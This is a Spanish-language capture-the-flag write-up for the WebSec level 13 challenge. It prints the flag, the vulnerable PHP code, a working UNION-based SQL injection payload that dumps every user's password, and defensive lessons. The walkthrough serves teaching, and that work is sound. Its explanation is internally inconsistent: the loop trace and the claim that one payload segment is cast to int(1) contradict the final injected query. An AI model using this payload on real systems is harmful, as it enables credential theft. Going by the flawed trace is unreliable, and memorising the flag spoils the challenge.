# WebSec Level 13 - Solución

## FLAG
```
WEBSEC{SQL_injection_in_your_cms,_made_simple}
```

## Vulnerabilidad Encontrada

El reto presenta una vulnerabilidad de **SQL Injection** causada por un bug sutil en el manejo de arrays en PHP.

### Análisis del Código

El código vulnerable:
```php
$tmp = explode(',',$_GET['ids']);
for ($i = 0; $i < count($tmp); $i++ ) {
    $tmp[$i] = (int)$tmp[$i];
    if( $tmp[$i] < 1 ) {
        unset($tmp[$i]);
    }
}

$selector = implode(',', array_unique($tmp));
$query = "SELECT user_id, user_privileges, user_name
  FROM users
  WHERE (user_id in (" . $selector . "));";
```

### El Bug

El problema está en el uso de `unset()` dentro del loop que usa `count()` como condición:

1. Cuando se hace `unset($tmp[$i])`, el elemento se elimina del array
2. `count($tmp)` disminuye inmediatamente
3. El loop continúa con `$i < count($tmp)`, que ahora es menor
4. **Los elementos al final del array NUNCA se procesan**

### Ejemplo del Bug

Input: `0,0,0,PAYLOAD`

1. `explode()` crea: `[0=>"0", 1=>"0", 2=>"0", 3=>PAYLOAD]`
2. Iteración i=0: `$tmp[0] = 0`, se hace `unset($tmp[0])`, count = 3
3. Iteración i=1: `$tmp[1] = 0`, se hace `unset($tmp[1])`, count = 2
4. Iteración i=2: `$tmp[2] = 0`, se hace `unset($tmp[2])`, count = 1
5. Loop termina porque `i=3` pero `count=1`, condición `3 < 1` es false
6. **El elemento $tmp[3] NUNCA fue procesado y queda como string original**

### Explotación

Payload final:
```
0,0,0,1)) UNION SELECT 0,0,user_password FROM users--
```

Después del procesamiento:
- Los tres primeros "0" son eliminados
- El elemento `"1)) UNION SELECT 0"` se convierte a int(1) y se mantiene
- Los elementos `"0"` y `"user_password FROM users--"` NO son procesados
- `implode()` junta todo: `"1)) UNION SELECT 0,0,user_password FROM users--"`

Query final ejecutada:
```sql
SELECT user_id, user_privileges, user_name 
FROM users 
WHERE (user_id in (1)) UNION SELECT 0,0,user_password FROM users--));
```

El UNION SELECT inyectado extrae el `user_password` de todos los usuarios (incluyendo el admin con user_id=0), y ese campo contiene la flag.

## Lecciones Aprendidas

1. **Nunca usar `unset()` en un loop que depende de `count()`** - esto causa que elementos no sean procesados
2. **Siempre usar prepared statements** para queries SQL
3. **Validación estricta de entrada** - el casting a `(int)` no es suficiente si hay bugs lógicos
4. **Testing exhaustivo** - este tipo de bugs solo se descubren con casos edge

## Referencias

Este nivel está basado en una vulnerabilidad real descubierta por @caillou, probablemente en CMS Made Simple u otro CMS.